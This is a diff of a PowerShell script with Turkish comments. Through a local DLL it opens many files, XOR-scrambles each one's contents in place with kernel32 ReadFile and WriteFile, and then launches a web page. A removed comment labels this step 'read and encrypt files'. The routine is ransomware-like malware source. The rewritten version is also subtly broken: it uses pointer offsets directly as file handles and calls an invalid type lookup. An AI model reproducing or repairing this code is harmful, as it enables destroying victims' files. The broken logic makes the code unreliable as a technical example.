@@ -1,68 +1,46 @@
-# Kernel32 API fonksiyonları
+# Kernel32 API
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public static class FileOps {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpBytesRead, IntPtr lpOverlapped);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpBytesWritten, IntPtr lpOverlapped);
-
-    [DllImport("kernel32.dll")]
-    public static extern uint SetFilePointer(IntPtr hFile, int lDistanceToMove, ref int lpDistanceToMoveHigh, uint dwMoveMethod);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr hObject);
+public class Kernel32 {
+    [DllImport("kernel32.dll")] public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpBytesRead, IntPtr lpOverlapped);
+    [DllImport("kernel32.dll")] public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpBytesWritten, IntPtr lpOverlapped);
+    [DllImport("kernel32.dll")] public static extern uint SetFilePointer(IntPtr hFile, int lDistanceToMove, ref int lpDistanceToMoveHigh, uint dwMoveMethod);
+    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);
 }
 "@
 
-# Native DLL çağırma
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public static class FileReader {
-    [DllImport("C:\Users\$env:USERNAME\Desktop\file_read_open.dll", EntryPoint="OpenAllFiles")]
-    public static extern void OpenAllFiles();
+# DLL’in tam yolu
+$dllPath = "C:\Users\YourUser\Desktop\file_read_open.dll"
+$asmBytes = [System.IO.File]::ReadAllBytes($dllPath)
+$asm = [Reflection.Assembly]::Load($asmBytes)
 
-    [DllImport("C:\Users\$env:USERNAME\Desktop\file_read_open.dll", EntryPoint="handlesArray")]
-    public static extern IntPtr GetHandleArray();
-    
-    [DllImport("C:\Users\$env:USERNAME\Desktop\file_read_open.dll", EntryPoint="handleCount")]
-    public static extern int GetHandleCount();
-}
-"@
+# Assembly fonksiyonu çağır
+$openAll = $asm.GetType("*").GetMethod("OpenAllFiles")
+$openAll.Invoke($null,@())
 
-# DLL’i çalıştır
-[FileReader]::OpenAllFiles()
+# Handle array’i almak
+$handlesField = $asm.GetType("*").GetField("handlesPtr")
+$countField = $asm.GetType("*").GetField("handleCount")
+$ptr = $handlesField.GetValue($null)
+$count = $countField.GetValue($null)
 
-# Handle array’ini al
-$handleCount = [FileReader]::GetHandleCount()
-$handlesPtr = [FileReader]::GetHandleArray()
+for ($i=0; $i -lt $count; $i++) {
+    $handle = [System.IntPtr]::new($ptr.ToInt64() + $i*8)  # pointer math
 
-$handles = @()
-for ($i=0; $i -lt $handleCount; $i++) {
-    $ptr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($handlesPtr, $i*8)
-    $handles += $ptr
-}
-
-# Dosyaları oku ve şifrele
-foreach ($handle in $handles) {
-    $bufferSize = 4096
-    $buffer = New-Object byte[] $bufferSize
+    $buffer = New-Object byte[] 4096
     $bytesRead = 0
 
-    if ([FileOps]::ReadFile($handle, $buffer, $bufferSize, [ref]$bytesRead, [IntPtr]::Zero)) {
-        for ($i=0; $i -lt $bytesRead; $i++) { $buffer[$i] = $buffer[$i] -bxor 0xAA }
-
-        [FileOps]::SetFilePointer($handle, 0, [ref]0, 0)
+    if ([Kernel32]::ReadFile($handle,$buffer,4096,[ref]$bytesRead,[IntPtr]::Zero)) {
+        for ($j=0; $j -lt $bytesRead; $j++) {
+            $buffer[$j] = $buffer[$j] -bxor 0xAA
+        }
         $bytesWritten = 0
-        [FileOps]::WriteFile($handle, $buffer, $bytesRead, [ref]$bytesWritten, [IntPtr]::Zero)
+        [Kernel32]::SetFilePointer($handle,0,[ref]0,0)
+        [Kernel32]::WriteFile($handle,$buffer,$bytesRead,[ref]$bytesWritten,[IntPtr]::Zero)
     }
-
-    [FileOps]::CloseHandle($handle)
+    [Kernel32]::CloseHandle($handle)
 }
 
-# Web site yönlendirme
-$websiteURL = "https://www.example.com"
-Start-Process $websiteURL
+# Web yönlendirme
+Start-Process "https://www.example.com"
